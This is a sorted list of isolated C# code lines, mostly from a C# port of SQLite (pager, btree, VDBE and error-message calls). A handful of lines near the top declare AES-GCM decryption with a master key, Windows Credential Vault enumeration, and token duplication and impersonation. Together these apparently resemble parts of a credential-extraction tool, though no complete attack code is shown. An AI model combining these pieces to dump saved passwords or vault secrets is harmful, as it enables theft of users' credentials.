"        private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)"
"        private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)"
"        private byte[] GetProperty(IntPtr hAlg, string name)"
"        private int ReadColumnNames( Vdbe vm, DataTable table )"
"        private int ReadNextRow( Vdbe vm, DataTable table )"
"        private static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken)"
"        psize = get2byte(data, pbegin "
"        ptrmapPut(pBt, childPgno, PTRMAP_BTREE, pgno, ref rc)"
"        ptrmapPut(pBt, iPage, PTRMAP_FREEPAGE, 0, ref rc)"
"        ptrmapPut(pBt, pgnoRoot, PTRMAP_ROOTPAGE, 0, ref rc)"
"        ptrmapPut(pPage.pBt, ovfl, PTRMAP_OVERFLOW1, pPage.pgno, ref pRC)"
"        ptrmapPutOvflPtr(pPage, pCell, ref rc)"
"        public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)"
"        public extern static Int32 VaultEnumerateItems(IntPtr vaultHandle, Int32 chunkSize, ref Int32 vaultItemCount, ref IntPtr vaultItem)"
"        public extern static Int32 VaultEnumerateVaults(Int32 offset, ref Int32 vaultCount, ref IntPtr vaultGuid)"
"        public extern static Int32 VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, Int32 arg5, ref IntPtr passwordVaultPtr)"
"        public extern static Int32 VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, Int32 arg6, ref IntPtr passwordVaultPtr)"
"        public extern static Int32 VaultOpenVault(ref Guid vaultGuid, UInt32 offset, ref IntPtr vaultHandle)"
"        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle)"
"        public static IntPtr OpenProcess(Process proc, ProcessAccessFlags flags)"
"        public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags)"
"        public static extern uint BCryptEncrypt(IntPtr hKey,"
"        public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags)"
"        public static extern uint BCryptImportKey(IntPtr hAlgorithm,"
"        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,"
"        public static readonly string BCRYPT_AES_ALGORITHM = ""AES"""
"        public static readonly string BCRYPT_AUTH_TAG_LENGTH = ""AuthTagLength"""
"        public static readonly string BCRYPT_CHAINING_MODE = ""ChainingMode"""
"        public static readonly string BCRYPT_CHAIN_MODE_GCM = ""ChainingModeGCM"""
"        public static readonly string BCRYPT_KEY_DATA_BLOB = ""KeyDataBlob"""
"        public static readonly string BCRYPT_OBJECT_LENGTH = ""ObjectLength"""
"        public static readonly string MS_PRIMITIVE_PROVIDER = ""Microsoft Primitive Provider"""
"        public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)"
"        put2byte(data, hdr "
"        put2byte(data, ins, idx)"
"        put2byte(data, pAddr, cbrk)"
"        put2byte(data, pCellptr, cellbody)"
"        put2byte(data, pPage.hdrOffset "
"        put32bits( zHeader, aJournalMagic.Length, 0 )"
"        put32bits( zHeader, aJournalMagic.Length, 0xffffffff )"
"        pz = sqlite3VMPrintf( p.db, zFormat, ap )"
"        pzErrMsg = """""
"        pzErrMsg = sqlite3_mprintf( ""not authorized"" )"
"        r1 = codeEqualityTerm( pParse, pTerm, pLevel, regBase "
"        r1 = sqlite3GenerateIndexKey( pParse, pIdx, iCur, 0, false )"
"        r2 = sqlite3ExprCodeTarget( pParse, pExpr, r1 )"
"        rc = accessPayload(pCur, offset, amt, pBuf, 0)"
"        rc = addToSavepointBitvecs( pPager, pPg.pgno )"
"        rc = allocateBtreePage(pBt, ref pChild, ref pgnoChild, pRoot.pgno, 0)"
"        rc = allocateBtreePage(pBt, ref pPageMove, ref pgnoMove, pgnoRoot, 1)"
"        rc = allocateBtreePage(pBt, ref pRoot, ref pgnoRoot, 1, 0)"
"        rc = allocateSpace(pPage, sz, ref idx)"
"        rc = btreeGetPage(pBt, iPtrPage, ref pPtrPage, 0)"
"        rc = btreeGetPage(pBt, iTrunk, ref pTrunk, 0)"
"        rc = btreeGetPage(pBt, ovfl, ref pPage, 0)"
"        rc = btreeGetPage(pBt, pPgno, ref ppPage, 0)"
"        rc = btreeMoveto(pCur, pKey, nKey, appendBias, ref loc)"
"        rc = clearCell(pPage, iCell)"
"        rc = clearCell(pPage, oldCell)"
"        rc = clearDatabasePage(pBt, (Pgno)iTable, 0, ref pnChange)"
"        rc = clearDatabasePage(pBt, sqlite3Get4byte(pPage.aData, 8), 1, ref pnChange)"
"        rc = copyPayload(aPayload, (u32)(offset "
"        rc = execSql( db, sqlite3_column_text( pStmt, 0 ) )"
"        rc = freePage2(pBt, pOvfl, ovflPgno)"
"        rc = getAndInitPage(pBt, pCur.pgnoRoot, ref pCur.apPage[0])"
"        rc = getAndInitPage(pBt, pgno, ref apOld[i])"
"        rc = id.fs.Seek( offset, SeekOrigin.Begin )"
"        rc = incrVacuumStep(pBt, 0, pagerPagecount(pBt))"
"        rc = memcmp( pMem1.z, pMem2.z, ( pMem1.n > pMem2.n ) "
"        rc = modifyPagePointer(pPtrPage, iDbPage, iFreePage, eType)"
"        rc = moveToChild(pCur, chldPg)"
"        rc = moveToChild(pCur, pgno)"
"        rc = moveToChild(pCur, sqlite3Get4byte(pPage.aData, findCell(pPage, idx)))"
"        rc = moveToChild(pCur, subpage)"
"        rc = osUnlock( pPager.fd, NO_LOCK )"
"        rc = pWalker.xSelectCallback( pWalker, p )"
"        rc = pagerOpentemp( pPager, ref  pPager.fd, (int)pPager.vfsFlags )"
"        rc = pager_delmaster( pPager, Encoding.UTF8.GetString( zMaster ) )"
"        rc = pager_end_transaction( pPager, pPager.setMaster )"
"        rc = pager_end_transaction( pPager, zMaster[0] != '"
"        rc = pager_error( pPager, rc )"
"        rc = pager_incr_changecounter( pPager, false )"
"        rc = ptrmapGet(pBt, iLastPg, ref eType, ref iPtrPage)"
"        rc = read32bits( jfd, ( pOffset ) - 4, ref cksum )"
"        rc = readJournalHdr( pPager, 0, (int)szJ, ref nJRec, ref dummy )"
"        rc = readJournalHdr( pPager, isHot, szJ, ref nRec, ref mxPg )"
"        rc = readMasterJournal( pPager.jfd, zMaster, (u32)pPager.pVfs.mxPathname "
"        rc = sqlite3ApiExit( db, rc )"
"        rc = sqlite3ApiExit( v.db, rc )"
"        rc = sqlite3BitvecSet(pBt.pHasContent, pgno)"
"        rc = sqlite3BtreeBeginTrans( pDb.pBt, 0 )"
"        rc = sqlite3BtreeCopyFile( pMain, pTemp )"
"        rc = sqlite3BtreeFactory( db, null, false, SQLITE_DEFAULT_CACHE_SIZE, flags,"
"        rc = sqlite3BtreeKey(pCur, 0, (u32)pCur.nKey, pKey)"
"        rc = sqlite3BtreeMovetoUnpacked( p.pCursor, null, p.movetoTarget, 0, ref res )"
"        rc = sqlite3BtreePrevious(pCur, ref notUsed)"
"        rc = sqlite3BtreeUpdateMeta(p, 4, pgnoRoot)"
"        rc = sqlite3Init( db, ref pParse.zErrMsg )"
"        rc = sqlite3Init( db, ref zErrDyn )"
"        rc = sqlite3InitOne( db, 1, ref pzErrMsg )"
"        rc = sqlite3InitOne( db, i, ref pzErrMsg )"
"        rc = sqlite3MemCompare( mem1, pPKey2.aMem[i], i < nField "
"        rc = sqlite3OsAccess( db.pVfs, zFile, SQLITE_ACCESS_EXISTS, ref res )"
"        rc = sqlite3OsAccess( pVfs, Encoding.UTF8.GetString( zMaster ), SQLITE_ACCESS_EXISTS, ref res )"
"        rc = sqlite3OsCheckReservedLock( pPager.fd, ref locked )"
"        rc = sqlite3OsDelete( pVfs, zMaster, 1 )"
"        rc = sqlite3OsFileSize( pPager.fd, ref currentSize )"
"        rc = sqlite3OsLock( pPager.fd, RESERVED_LOCK )"
"        rc = sqlite3OsOpen( pVfs, pPager.zFilename, pPager.fd, vfsFlags, ref fout )"
"        rc = sqlite3OsOpen( pVfs, zFile, pFile, flags, ref pOutFlags )"
"        rc = sqlite3OsOpen( pVfs, zMaster, pMaster, flags, ref  iDummy )"
"        rc = sqlite3OsRead( pPager.fd, pDest, N, 0 )"
"        rc = sqlite3OsRead( pPager.jfd, aMagic, aMagic.Length, iHdrOff )"
"        rc = sqlite3OsSync( pPager.fd, pPager.sync_flags )"
"        rc = sqlite3OsTruncate( pFile, iSize )"
"        rc = sqlite3OsTruncate( pPager.jfd, pPager.journalOff )"
"        rc = sqlite3OsWrite( pPager.fd, aData, pPager.pageSize, ofst )"
"        rc = sqlite3OsWrite( pPager.jfd, zHeader, (int)nHeader, pPager.journalOff )"
"        rc = sqlite3PagerAcquire( pPager, origPgno, ref pNew, 1 )"
"        rc = sqlite3PagerBegin( pPager, false, pPager.subjInMemory )"
"        rc = sqlite3PagerCommitPhaseOne(pBt.pPager, zMaster, false)"
"        rc = sqlite3PagerGet( pPager, 1, ref pPgHdr )"
"        rc = sqlite3PagerGet( pPager, needSyncPgno, ref pPgHdr )"
"        rc = sqlite3PagerOpen(pVfs, ref pBt.pPager, zFilename,"
"        rc = sqlite3PagerOpenSavepoint(pBt.pPager, iStatement)"
"        rc = sqlite3PagerOpenSavepoint(pBt.pPager, p.db.nSavepoint)"
"        rc = sqlite3PagerSavepoint(pBt.pPager, op, iSavepoint)"
"        rc = sqlite3PagerSetPagesize( pPager, ref iPageSize16, -1 )"
"        rc = sqlite3PagerSetPagesize( pPager, ref szPageDflt, -1 )"
"        rc = sqlite3PagerSetPagesize(pBt.pPager, ref pBt.pageSize, nReserve)"
"        rc = sqlite3Prepare( db, zSql, nBytes, saveSqlFlag, ref ppStmt, ref  pzTail )"
"        rc = sqlite3Select( pParse, pSelect, ref dest )"
"        rc = sqlite3_exec( db, argv[2], null, null, ref zErr )"
"        rc = sqlite3_exec( db, zSql, (dxCallback)analysisLoader, sInfo, 0 )"
"        rc = sqlite3_exec( db, zSql, (dxCallback)sqlite3InitCallback, initData, 0 )"
"        rc = sqlite3_prepare( db, zSql, -1, ref pStmt, ref zLeftover )"
"        rc = write32bits( pPager.sjfd, offset, pPg.pgno )"
"        rc = writeMasterJournal( pPager, zMaster )"
"        rc2 = osUnlock( pPager.fd, SHARED_LOCK )"
"        ref old_col_mask, ref new_col_mask ) != 0 )"
"        regBase = codeAllEqualityTerms( pParse, pLevel, pWC, notReady, nExtraReg )"
"        regCols = sqlite3GetTempRange( pParse, pTab.nCol )"
"        regIdx = sqlite3GetTempRange( pParse, pIdx.nColumn "
"        regPrev = sqlite3GetTempRange( pParse, nExpr "
"        regPrev, pKeyDup, P4_KEYINFO_STATIC, labelEnd )"
"        regR, regIdx,//regR, SQLITE_INT_TO_PTR(regIdx),"
"        regRowid = sqlite3ExprCodeGetColumn( pParse, pTab, -1, iCur, iRowid, false )"
"        reindexDatabases( pParse, null )"
"        reindexTable( pParse, pTab, null )"
"        res = lockingStrategy.SharedLockFile( pFile, SHARED_FIRST, SHARED_SIZE )"
"        resolveP2Values( p, ref nArg )"
"        return """""
"        return ""unknown error"""
"        return LockFileEx( pFile.fs.Handle, LOCKFILE_FAIL_IMMEDIATELY, 0, (uint)length, 0, ref ovlp ) "
"        return btreePageFromDbPage(pDbPage, pgno, pBt)"
"        return multiSelect( pParse, p, pDest )"
"        return multiSelectOrderBy( pParse, p, pDest )"
"        return sqlite3PExpr( pParse, TK_NULL, null, null, null )"
"        return sqlite3PutVarint( p, 0, v )"
"        rowSetTreeToList( p.pTree, ref  pHead, ref  pTail )"
"        rowSetTreeToList( pIn.pLeft, ref  ppFirst, ref  p )"
"        rowSetTreeToList( pIn.pRight, ref  pIn.pRight, ref   ppLast )"
"        rules (11), (13) and (14), they may also contain ORDER BY,"
"        selectInnerLoop( pParse, p, pEList, 0, 0, pOrderBy, -1, pDest,"
"        setDateTimeToCurrent( context, p )"
"        setJoinExpr( p.pLeft, iTable )"
"        setResultStrOrError( pCtx, sqlite3ErrStr( errCode ), -1,"
"        size = cellSizePtr(pPage, temp, pc)"
"        sqlite3AtoF( z, ref value )"
"        sqlite3AtoF( zBuf, ref r )"
"        sqlite3AtoF( zDate, ref r )"
"        sqlite3Atoi64( pMem.z, ref value )"
"        sqlite3AuthRead( pParse, pExpr, pSchema, pNC.pSrcList )"
"        sqlite3BeginWriteOperation( pParse, 0, iDb )"
"        sqlite3BeginWriteOperation( pParse, 1, iDb )"
"        sqlite3BtreeGetMeta( pBt, BTREE_SCHEMA_VERSION, ref cookie )"
"        sqlite3BtreeGetMeta( pDb.pBt, i "
"        sqlite3BtreeGetMeta(p, BTREE_LARGEST_ROOT_PAGE, ref pgnoRoot)"
"        sqlite3BtreeMutexArrayInsert( p.aMutex, p.db.aDb[i].pBt )"
"        sqlite3BtreeSetAutoVacuum( pMain, sqlite3BtreeGetAutoVacuum( pTemp ) )"
"        sqlite3BtreeSetCacheSize( pDb.pBt, pDb.pSchema.cache_size )"
"        sqlite3BtreeSetCacheSize( ppBtree, nCache )"
"        sqlite3BtreeSetSafetyLevel( pDb.pBt, pDb.safety_level,"
"        sqlite3ChangeCookie( pParse, iDb )"
"        sqlite3CodeRowTrigger( pParse, pTrigger, TK_DELETE, null,"
"        sqlite3CodeSubselect( pParse, pX, rMayHaveNull, eType == IN_INDEX_ROWID )"
"        sqlite3CodeVerifySchema( pParse, iDb )"
"        sqlite3ColumnDefault( v, pTab, iColumn, iReg )"
"        sqlite3CompleteInsertion( pParse, pTab, iCur, regNewRowid,"
"        sqlite3ConnectionBlocked(p.db, pBt.pCursor.pBtree.db)"
"        sqlite3CreateFunc( db, zName, nArg, SQLITE_UTF8,"
"        sqlite3CreateIndex( pParse, null, null, null, pList, onError, null, null, sortOrder, 0 )"
"        sqlite3DebugPrintf( "" "" )"
"        sqlite3DebugPrintf( """
"        sqlite3DebugPrintf( ""%"
"        sqlite3DebugPrintf( ""(%d"", p.op )"
"        sqlite3DebugPrintf( ""(%s"", p.u.zToken )"
"        sqlite3DeleteTrigger( db, ref pTrigger )"
"        sqlite3DeleteTrigger( null, ref pTrigger )"
"        sqlite3Error( db, SQLITE_BUSY,"
"        sqlite3Error( db, SQLITE_NOMEM, """" )"
"        sqlite3Error( db, p.rc, 0 )"
"        sqlite3Error( db, rc, ""%s"", zErrMsg )"
"        sqlite3Error( db, rc, ""no such vfs: %s"", zVfs )"
"        sqlite3Error( db, rc, 0 )"
"        sqlite3Error( p.db, SQLITE_MISUSE, 0 )"
"        sqlite3Error( p.db, SQLITE_RANGE, 0 )"
"        sqlite3Error( pErrorDb, SQLITE_ERROR, ""unknown database %s"", zDb )"
"        sqlite3ErrorMsg( pParse, ""%d values for %d columns"", nColumn, pColumn.nId )"
"        sqlite3ErrorMsg( pParse, ""AUTOINCREMENT is only allowed on an "" "
"        sqlite3ErrorMsg( pParse, ""Cannot add a PRIMARY KEY column"" )"
"        sqlite3ErrorMsg( pParse, ""Cannot add a UNIQUE column"" )"
"        sqlite3ErrorMsg( pParse, ""Cannot add a column to a view"" )"
"        sqlite3ErrorMsg( pParse, ""LIMIT clause should come after %s not before"","
"        sqlite3ErrorMsg( pParse, ""ORDER BY clause should come after %s not before"","
"        sqlite3ErrorMsg( pParse, ""SELECTs to the left and right of %s"" "
"        sqlite3ErrorMsg( pParse, ""a JOIN clause is required before %s"","
"        sqlite3ErrorMsg( pParse, ""at most %d tables in a join"", BMS )"
"        sqlite3ErrorMsg( pParse, ""cannot create %s trigger on view: %S"","
"        sqlite3ErrorMsg( pParse, ""cannot create INSTEAD OF"" "
"        sqlite3ErrorMsg( pParse, ""cannot create trigger on system table"" )"
"        sqlite3ErrorMsg( pParse, ""cannot create triggers on virtual tables"" )"
"        sqlite3ErrorMsg( pParse, ""cannot modify %s because it is a view"", pTab.zName )"
"        sqlite3ErrorMsg( pParse, ""index associated with UNIQUE "" "
"        sqlite3ErrorMsg( pParse, ""near "
"        sqlite3ErrorMsg( pParse, ""object name reserved for internal use: %s"", zName )"
"        sqlite3ErrorMsg( pParse, ""only a single result allowed for "" "
"        sqlite3ErrorMsg( pParse, ""parameters are not allowed in views"" )"
"        sqlite3ErrorMsg( pParse, ""table %s may not be altered"", pTab.zName )"
"        sqlite3ErrorMsg( pParse, ""table %s may not be dropped"", pTab.zName )"
"        sqlite3ErrorMsg( pParse, ""table %s may not be indexed"", pTab.zName )"
"        sqlite3ErrorMsg( pParse, ""table %s may not be modified"", pTab.zName )"
"        sqlite3ErrorMsg( pParse, ""temporary table name must be unqualified"" )"
"        sqlite3ErrorMsg( pParse, ""too many SQL variables"" )"
"        sqlite3ErrorMsg( pParse, ""too many columns in %s"", zObject )"
"        sqlite3ErrorMsg( pParse, ""too many columns on %s"", p.zName )"
"        sqlite3ErrorMsg( pParse, ""unknown or unsupported join type: "" "
"        sqlite3ErrorMsg( pParse, ""use DROP TABLE to delete table %s"", pTab.zName )"
"        sqlite3ErrorMsg( pParse, ""use DROP VIEW to delete view %s"", pTab.zName )"
"        sqlite3ErrorMsg( pParse, ""view %s is circularly defined"", pTable.zName )"
"        sqlite3ErrorMsg( pParse, ""view %s may not be altered"", pTab.zName )"
"        sqlite3ErrorMsg( pParse, ""views may not be indexed"" )"
"        sqlite3ErrorMsg( pParse, ""virtual tables may not be altered"" )"
"        sqlite3ErrorMsg( pParse, ""virtual tables may not be indexed"" )"
"        sqlite3ErrorMsg( pParse,"
"        sqlite3ExprAnalyzeAggList( sNC, pEList )"
"        sqlite3ExprAnalyzeAggList( sNC, pOrderBy )"
"        sqlite3ExprAttachSubtrees( db, pNew, pLeft, pRight )"
"        sqlite3ExprCacheAffinityChange( pParse, _base, n )"
"        sqlite3ExprCacheAffinityChange( pParse, in1, 1 )"
"        sqlite3ExprCacheAffinityChange( pParse, in2, 1 )"
"        sqlite3ExprCacheAffinityChange( pParse, regAgg, nArg )"
"        sqlite3ExprCacheAffinityChange( pParse, regBase, nCol "
"        sqlite3ExprCacheAffinityChange( pParse, regIdx, pIdx.nColumn "
"        sqlite3ExprCacheStore( pParse, iCur, -1, iRowidReg )"
"        sqlite3ExprCode( pParse, p.pLimit, iLimit )"
"        sqlite3ExprCode( pParse, pC.pExpr, pC.iMem )"
"        sqlite3ExprCodeCopy( pParse, pIn.iMem, regPrev "
"        sqlite3ExprCodeExprList( pParse, pEList, regResult, eDest == SRT_Output )"
"        sqlite3ExprDelete( db, ref p.pLeft )"
"        sqlite3ExprDelete( db, ref p.pRight )"
"        sqlite3ExprDelete( db, ref pCheckExpr )"
"        sqlite3ExprDelete( db, ref pItem.pOn )"
"        sqlite3ExprDelete( db, ref pLeft )"
"        sqlite3ExprDelete( db, ref pRight )"
"        sqlite3ExprDelete( db, ref pTmp.pWhere )"
"        sqlite3ExprIfFalse( pParse, pE, addrCont, SQLITE_JUMPIFNULL )"
"        sqlite3ExprIfFalse( pParse, pWhere, pWInfo.iBreak, SQLITE_JUMPIFNULL )"
"        sqlite3ExprIfTrue( pParse, pTab.pCheck, allOk, SQLITE_JUMPIFNULL )"
"        sqlite3ExprListDelete( db, ref p.pOrderBy )"
"        sqlite3ExprListDelete( db, ref pEList )"
"        sqlite3ExprListDelete( db, ref pList )"
"        sqlite3ExprListDelete( db, ref pTmp.pExprList )"
"        sqlite3ExprListSetName( pParse, pList, nullId, 0 )"
"        sqlite3FixSrcList( sFix, pTblName ) != 0"
"        sqlite3FuncDefInsert( db.aFunc, pBest )"
"        sqlite3FuncDefInsert( pHash, aFunc[i] )"
"        sqlite3GenerateConstraintChecks( pParse, pTab, iCur, regNewRowid,"
"        sqlite3GenerateRowIndexDelete( pParse, pTab, iCur, aRegIdx )"
"        sqlite3GlobalConfig.pcache.xCachesize( p, pCache.nMax )"
"        sqlite3GlobalConfig.pcache.xCachesize( pCache.pCache, mxPage )"
"        sqlite3GlobalConfig.pcache.xTruncate( pCache.pCache, pgno "
"        sqlite3GlobalConfig.pcache.xUnpin( pCache.pCache, p, 0 )"
"        sqlite3IdListDelete( db, ref pItem.pUsing )"
"        sqlite3IdListDelete( db, ref pList )"
"        sqlite3IdListDelete( db, ref pTmp.pIdList )"
"        sqlite3IndexAffinityStr( v, pIdx )"
"        sqlite3MPrintf( db, ""tbl_name='%q'"", p.zName ), P4_DYNAMIC )"
"        sqlite3MaterializeView( pParse, pTab, pWhere, iCur )"
"        sqlite3MemoryAlarm( (dxalarmCallback)softHeapLimitEnforcer, 0, iLimit )"
"        sqlite3MemoryAlarm( null, null, 0 )"
"        sqlite3NestedParse( pParse,"
"        sqlite3OpenMasterTable( pParse, iDb )"
"        sqlite3OpenTable( pParse, 0, p.iDb, pDb.pSchema.pSeqTab, OP_OpenRead )"
"        sqlite3OpenTable( pParse, 0, p.iDb, pDb.pSchema.pSeqTab, OP_OpenWrite )"
"        sqlite3OsCurrentTime( db.pVfs, ref rNow )"
"        sqlite3OsDlClose( db.pVfs, (HANDLE)db.aExtension[i] )"
"        sqlite3OsDlError( pVfs, nMsg - 1, ref zErrmsg )"
"        sqlite3OsRandomness( sqlite3_vfs_find( """" ), 256, ref k )"
"        sqlite3PagerJournalMode( pPager, db.dfltJournalMode )"
"        sqlite3PagerJournalMode( sqlite3BtreePager( db.aDb[1].pBt ),"
"        sqlite3PagerLockingMode( pPager, db.dfltLockMode )"
"        sqlite3PagerPagecount( pPager, ref nPageCount )"
"        sqlite3PagerPagecount(pBt.pPager, ref nPage)"
"        sqlite3PagerSetBusyhandler(pBt.pPager, btreeInvokeBusyHandler, pBt)"
"        sqlite3PagerTruncateImage(pBt.pPager, iLastPg)"
"        sqlite3Parser( pEngine, 0, pParse.sLastToken, pParse )"
"        sqlite3Put4byte(pP1, 36 "
"        sqlite3Put4byte(pPage.aData, iTo)"
"        sqlite3Put4byte(pPage1.aData, (u32)36, n - 1)"
"        sqlite3Put4byte(pParent.aData, pParent.hdrOffset "
"        sqlite3RefillIndex( pParse, pIndex, -1 )"
"        sqlite3ReleaseTempRange( pParse, regAgg, nArg )"
"        sqlite3ReleaseTempRange( pParse, regCols, pTab.nCol )"
"        sqlite3ReleaseTempRange( pParse, regIdx, pIdx.nColumn "
"        sqlite3ReleaseTempRange( pParse, regPrev, nOrderBy "
"        sqlite3ReleaseTempReg( pParse, iRec )"
"        sqlite3ReleaseTempReg( pParse, r1 )"
"        sqlite3ReleaseTempReg( pParse, r2 )"
"        sqlite3ReleaseTempReg( pParse, regR )"
"        sqlite3ReleaseTempReg( pParse, regRec )"
"        sqlite3ReleaseTempReg( pParse, regRow )"
"        sqlite3ReleaseTempReg( pParse, regRowid )"
"        sqlite3ReleaseTempReg( pParse, regTrigRowid )"
"        sqlite3ResetInternalSchema( db, 0 )"
"        sqlite3ResolveExprNames( sNC, ref p.pHaving ) != 0"
"        sqlite3ResolveExprNames( sNC, ref p.pOffset ) != 0 )"
"        sqlite3ResolveOrderGroupBy( pParse, pPrior, pPrior.pOrderBy, ""ORDER"" )"
"        sqlite3RunParser( pParse, zSql, ref zErrMsg )"
"        sqlite3SelectDelete( db, ref p.pPrior )"
"        sqlite3SelectDelete( db, ref pItem.pSelect )"
"        sqlite3SelectDelete( db, ref pSel )"
"        sqlite3SelectDelete( db, ref pSelect )"
"        sqlite3SelectDelete( db, ref pTmp.pSelect )"
"        sqlite3SelectDestInit( dest, SRT_Coroutine, "
"        sqlite3SelectPrep( pParse, p, pOuterNC )"
"        sqlite3SetString( ref p.zErrMsg, db, ""%s"", sqlite3ErrStr( rc ) )"
"        sqlite3SetString( ref p.zErrMsg, db, sqlite3ErrStr( p.rc ) )"
"        sqlite3SetString( ref pParse.zErrMsg, db, sqlite3ErrStr( pParse.rc ) )"
"        sqlite3SetString( ref pzErrMsg, db, ""cannot VACUUM from within a transaction"" )"
"        sqlite3SetString( ref pzErrMsg, db, ""unsupported file format"" )"
"        sqlite3SrcListAssignCursors( pParse, pSel.pSrc )"
"        sqlite3StatusAdd( SQLITE_STATUS_MEMORY_USED, -sqlite3MallocSize( p ) )"
"        sqlite3StatusAdd( SQLITE_STATUS_MEMORY_USED, nFull )"
"        sqlite3StatusAdd( SQLITE_STATUS_PAGECACHE_OVERFLOW, -iSize )"
"        sqlite3StatusAdd( SQLITE_STATUS_PAGECACHE_OVERFLOW, sz )"
"        sqlite3StatusAdd( SQLITE_STATUS_PAGECACHE_USED, -1 )"
"        sqlite3StatusAdd( SQLITE_STATUS_PAGECACHE_USED, 1 )"
"        sqlite3StatusSet( SQLITE_STATUS_MALLOC_SIZE, nBytes )"
"        sqlite3StatusSet( SQLITE_STATUS_PAGECACHE_SIZE, nByte )"
"        sqlite3StatusSet( SQLITE_STATUS_SCRATCH_SIZE, n )"
"        sqlite3StrAccumAppend( pAccum, zVal, nVal )"
"        sqlite3StrAccumAppend(pCheck.errMsg, """
"        sqlite3StrAccumAppend(pCheck.errMsg, zMsg1, -1)"
"        sqlite3Strlen30( p.zName ), p )"
"        sqlite3TableLock( pParse, iDb, iRootPage, 1, ""sqlite_stat1"" )"
"        sqlite3TableLock( pParse, iDb, pTab.tnum, 0, pTab.zName )"
"        sqlite3ValueFromExpr( sqlite3VdbeDb( v ), pCol.pDflt, enc,"
"        sqlite3ValueSetStr( db.pErr, -1, p.zErrMsg, SQLITE_UTF8, SQLITE_TRANSIENT )"
"        sqlite3VdbeAddOp0( v, OP_Close )"
"        sqlite3VdbeAddOp0( v, OP_Halt )"
"        sqlite3VdbeAddOp1( pParse.pVdbe, OP_Statement, iDb )"
"        sqlite3VdbeAddOp1( v, OP_Close, 0 )"
"        sqlite3VdbeAddOp1( v, OP_Close, baseCur )"
"        sqlite3VdbeAddOp1( v, OP_Close, iIdxCur )"
"        sqlite3VdbeAddOp1( v, OP_Close, srcTab )"
"        sqlite3VdbeAddOp1( v, OP_Delete, pOrderBy.iECursor )"
"        sqlite3VdbeAddOp1( v, OP_Expire, ( type == SQLITE_ATTACH ) "
"        sqlite3VdbeAddOp1( v, OP_If, mem )"
"        sqlite3VdbeAddOp1( v, OP_Last, pOrderBy.iECursor )"
"        sqlite3VdbeAddOp1( v, OP_LoadAnalysis, iDb )"
"        sqlite3VdbeAddOp1( v, OP_MustBeInt, iLimit )"
"        sqlite3VdbeAddOp1( v, OP_Yield, dest.iParm )"
"        sqlite3VdbeAddOp1( v, OP_Yield, regAddrA )"
"        sqlite3VdbeAddOp1( v, OP_Yield, regAddrB )"
"        sqlite3VdbeAddOp2( pParse.pVdbe, OP_Copy, iFrom "
"        sqlite3VdbeAddOp2( pParse.pVdbe, OP_MemMax, memId, regRowid )"
"        sqlite3VdbeAddOp2( pParse.pVdbe, OP_SCopy, inReg, target )"
"        sqlite3VdbeAddOp2( v, OP_AddImm, iLimit, -1 )"
"        sqlite3VdbeAddOp2( v, OP_AddImm, iMem, 1 )"
"        sqlite3VdbeAddOp2( v, OP_AddImm, p.iLimit, -1 )"
"        sqlite3VdbeAddOp2( v, OP_AddImm, p.iOffset, -1 )"
"        sqlite3VdbeAddOp2( v, OP_AddImm, regRowCount, 1 )"
"        sqlite3VdbeAddOp2( v, OP_Affinity, _base, n )"
"        sqlite3VdbeAddOp2( v, OP_AutoCommit, 1, 0 )"
"        sqlite3VdbeAddOp2( v, OP_AutoCommit, 1, 1 )"
"        sqlite3VdbeAddOp2( v, OP_Clear, pStat.tnum, iDb )"
"        sqlite3VdbeAddOp2( v, OP_Clear, tnum, iDb )"
"        sqlite3VdbeAddOp2( v, OP_Close, 0, 0 )"
"        sqlite3VdbeAddOp2( v, OP_Close, iDest, 0 )"
"        sqlite3VdbeAddOp2( v, OP_Close, iSrc, 0 )"
"        sqlite3VdbeAddOp2( v, OP_Close, newIdx, 0 )"
"        sqlite3VdbeAddOp2( v, OP_Close, oldIdx, 0 )"
"        sqlite3VdbeAddOp2( v, OP_Close, pseudoTab, 0 )"
"        sqlite3VdbeAddOp2( v, OP_Copy, ( p.iOffset != 0 ) "
"        sqlite3VdbeAddOp2( v, OP_Copy, inReg, iMem )"
"        sqlite3VdbeAddOp2( v, OP_Copy, regLimitA, regLimitB )"
"        sqlite3VdbeAddOp2( v, OP_CreateIndex, iDb, iMem )"
"        sqlite3VdbeAddOp2( v, OP_Gosub, regOutA, addrOutA )"
"        sqlite3VdbeAddOp2( v, OP_Gosub, regOutB, addrOutB )"
"        sqlite3VdbeAddOp2( v, OP_Goto, 0, addr "
"        sqlite3VdbeAddOp2( v, OP_Goto, 0, addr )"
"        sqlite3VdbeAddOp2( v, OP_Goto, 0, addrCont )"
"        sqlite3VdbeAddOp2( v, OP_Goto, 0, addrEofA )"
"        sqlite3VdbeAddOp2( v, OP_Goto, 0, addrEofB )"
"        sqlite3VdbeAddOp2( v, OP_Goto, 0, endOfLoop )"
"        sqlite3VdbeAddOp2( v, OP_Goto, 0, iBeginAfterTrigger )"
"        sqlite3VdbeAddOp2( v, OP_Goto, 0, iBeginBeforeTrigger )"
"        sqlite3VdbeAddOp2( v, OP_Goto, 0, iContinue )"
"        sqlite3VdbeAddOp2( v, OP_Goto, 0, labelCmpr )"
"        sqlite3VdbeAddOp2( v, OP_Halt, SQLITE_INTERNAL, OE_Abort )"
"        sqlite3VdbeAddOp2( v, OP_Halt, SQLITE_OK, 0 )"
"        sqlite3VdbeAddOp2( v, OP_IdxInsert, baseCur "
"        sqlite3VdbeAddOp2( v, OP_If, regEofA, addrEofA )"
"        sqlite3VdbeAddOp2( v, OP_IfZero, iLimit, iBreak )"
"        sqlite3VdbeAddOp2( v, OP_IfZero, p.iLimit, iBreak )"
"        sqlite3VdbeAddOp2( v, OP_Integer, 0, memCnt )"
